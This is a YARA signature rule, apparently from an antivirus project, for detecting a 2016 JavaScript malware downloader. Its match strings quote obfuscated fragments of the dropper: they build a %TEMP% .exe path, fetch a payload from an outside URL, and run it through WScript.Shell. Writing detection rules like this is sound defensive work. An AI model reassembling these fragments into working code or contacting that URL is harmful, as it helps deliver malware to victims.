rule sig_20160328_d49b98cbe6e9b2b725e6d6c59edea742 {
  meta:
    description = "datamaliciousorder - file 20160328_d49b98cbe6e9b2b725e6d6c59edea742.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5cce0f1dff4d355252c8a1c6166be7140348e69382fcf259a6016c978c49ca47"

  strings:
    $s1  = "function Vrruyhlmf() {return Agumnl[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"zzVf8DE5mbHoNCM.exe\";};" fullword ascii
    $s2  = "Hbkee[Xkjdhvl](\"GET\", \"http://blackmountaintipis.com/mxn3aad\", false);" fullword ascii
    $s3  = "do {WScript[Roskrsunqc](Lvnledxw() * 11)} while (Hbkee[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Ufssffl(Ihyytoq, Clgjol){return Ihyytoq - Clgjol;};" fullword ascii
    $s5  = "var Agumnl = function Iunwtbxnzf() {return WScript[Dqrbqqhhp](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Cefapan() {return ((Ikryhh == true) && (Ikryhh == Feied)) ? 1 : Hilehxm;};" fullword ascii
    $s7  = "function Nhkfds(Csvvszwa){Agumnl[\"Run\"](Csvvszwa, Hilehxm, Hilehxm);};" fullword ascii
    $s8  = "Ikryhh = true; " fullword ascii
    $s9  = " while (Fmsbwxike){" fullword ascii
    $s10 = "function Yshyhe(){return Kqhlnzhz;};" fullword ascii
    $s11 = "return Ufssffl(Eukkrqbsf, Uwjuhr);" fullword ascii
    $s12 = "function Bxtgnvqsq(Rgqsqcf) {var Yjvfhog = (1, 2, 3, 4, 5, Rgqsqcf); return Yjvfhog;};" fullword ascii
    $s13 = "var Gtwdoj = new this[\"Date\"]();" fullword ascii
    $s14 = "var Deedaniihn = false;" fullword ascii
    $s15 = "var Feied = false;" fullword ascii
    $s16 = "Feied = true; " fullword ascii
    $s17 = "function Lvnledxw(){return 22;};" fullword ascii
    $s18 = "function Nvkikq(){return Dqrbqqhhp;};" fullword ascii
    $s19 = "var Ikryhh = false;" fullword ascii
    $s20 = "function Knzfttf()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}